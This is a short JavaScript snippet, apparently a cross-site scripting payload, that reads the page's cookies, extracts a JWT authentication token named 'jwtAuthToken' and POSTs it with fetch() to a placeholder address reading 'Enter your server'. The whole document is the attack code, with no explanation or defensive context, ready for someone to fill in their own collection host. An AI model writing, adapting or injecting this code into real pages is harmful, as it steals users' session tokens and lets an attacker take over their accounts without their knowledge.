(function() {
  console.log(document.cookie); 

  const jwtToken = getCookie('jwtAuthToken'); 
  console.log("Extracted Token:", jwtToken);

  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
  }
  
  if (jwtToken) {
    fetch('Enter your server', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ token: jwtToken })
    }).then(response => {
      console.log("Token sent successfully");
    }).catch(error => {
      console.error("Error sending token:", error);
    });
  }
})();
